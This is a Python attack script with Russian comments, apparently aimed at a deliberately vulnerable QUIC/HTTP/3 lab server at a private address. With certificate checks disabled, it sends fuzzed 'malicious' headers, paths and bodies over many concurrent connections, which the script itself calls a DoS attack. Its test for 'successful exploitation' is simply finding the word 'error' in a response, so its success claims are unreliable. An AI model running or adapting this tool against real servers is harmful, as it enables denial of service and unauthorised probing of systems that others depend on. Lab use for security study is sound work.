import asyncio
import random
from datetime import datetime
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived
from aioquic.asyncio.protocol import QuicConnectionProtocol

def generate_fuzz_payload(length=100):
    """Генерация случайных данных для фаззинга"""
    chars = list(range(0x20, 0x7F)) + [0x00, 0x0A, 0x0D]
    payload = bytes(random.choice(chars) for _ in range(length))
    print(f"Сгенерирован фаззинг-пакет длиной {length} байт")
    return payload

class ExploitClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http = None
        self._response_waiter = asyncio.Future()

    async def send_request(self, headers, data):
        if self._http is None:
            self._http = H3Connection(self._quic)

        stream_id = self._quic.get_next_available_stream_id()

        print("\n=== Эксплуатация уязвимости: Отправка вредоносных заголовков ===")
        self._http.send_headers(
            stream_id=stream_id,
            headers=headers,
            end_stream=False
        )

        print("=== Эксплуатация уязвимости: Отправка вредоносных данных ===")
        self._http.send_data(
            stream_id=stream_id,
            data=data,
            end_stream=True
        )

        return await self._response_waiter

    def quic_event_received(self, event):
        if self._http is None:
            self._http = H3Connection(self._quic)

        for http_event in self._http.handle_event(event):
            if isinstance(http_event, DataReceived):
                if not self._response_waiter.done():
                    print("\n=== Получен ответ от сервера ===")
                    print(f"Длина ответа: {len(http_event.data)} байт")
                    if len(http_event.data) > 100:
                        print(f"Начало ответа: {http_event.data[:100]!r}...")
                    else:
                        print(f"Полный ответ: {http_event.data!r}")

                    # Проверяем утечку информации в ответе
                    if b"VulnerableQUIC" in http_event.data:
                        print("!!! Обнаружена утечка информации о сервере в ответе !!!")

                    self._response_waiter.set_result(http_event.data)

class QuicExploitClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.configuration = QuicConfiguration(
            is_client=True,
            alpn_protocols=H3_ALPN,
            verify_mode=0  # Уязвимость: отключение проверки сертификата
        )
        print("\n=== Клиент сконфигурирован с уязвимыми параметрами ===")
        print("!!! ПРЕДУПРЕЖДЕНИЕ: Проверка сертификатов отключена (verify_mode=0) !!!")

    async def send_exploit_payload(self, iteration: int):
        try:
            print(f"\n--- Попытка эксплуатации #{iteration} ---")

            async with connect(
                host=self.host,
                port=self.port,
                configuration=self.configuration,
                create_protocol=ExploitClientProtocol,
            ) as protocol:
                # Генерация вредоносных заголовков
                headers = [
                    (b":method", b"GET"),
                    (b":path", b"/?" + generate_fuzz_payload(50)),
                    (b":scheme", b"https"),
                    (b":authority", self.host.encode()),
                    (b"user-agent", b"haCker Exploit Client"),
                    (b"x-malicious", generate_fuzz_payload(100)),  # Вредоносный заголовок
                ]

                # Генерация вредоносных данных
                data = b"EXPLOIT_PAYLOAD_" + generate_fuzz_payload(500)

                print("\nОтправка вредоносного запроса...")
                response = await protocol.send_request(headers=headers, data=data)

                self.analyze_response(response, iteration)

        except Exception as e:
            print(f"[{iteration}] ❌ Ошибка: {str(e)}")

    def analyze_response(self, response: bytes, iteration: int):
        if response:
            print(f"[{iteration}] ✅ Получен ответ ({len(response)} байт)")
            if b"error" in response.lower():
                print("!!! Успешная эксплуатация уязвимости !!!")

            with open("/opt/haCker_client_log.txt", "ab") as f:
                f.write(f"[{datetime.now()}] Response: {response[:200]}\n".encode())
        else:
            print(f"[{iteration}] ❌ Пустой ответ - сервер возможно упал")

    async def run_exploit(self, threads=100):
        print(f"\nЗапуск {threads} атакующих потоков...")
        tasks = []
        for i in range(threads):
            task = asyncio.create_task(self.send_exploit_payload(i))
            tasks.append(task)
            await asyncio.sleep(0.1)  # Небольшая задержка между запросами

        print("\n=== Начало DoS атаки ===")
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("QUIC Exploit Client - Демонстрация уязвимостей")
    print("Цель: vulnerable server QUIC aka 'vsQUIC'")
    print("Используемые техники:")
    print("- Отправка вредоносных заголовков")
    print("- Фаззинг данных")
    print("- DoS через множественные запросы")
    print("- Обход проверки сертификатов")

    client = QuicExploitClient("172.21.32.21", 4433)
    asyncio.run(client.run_exploit(threads=10))
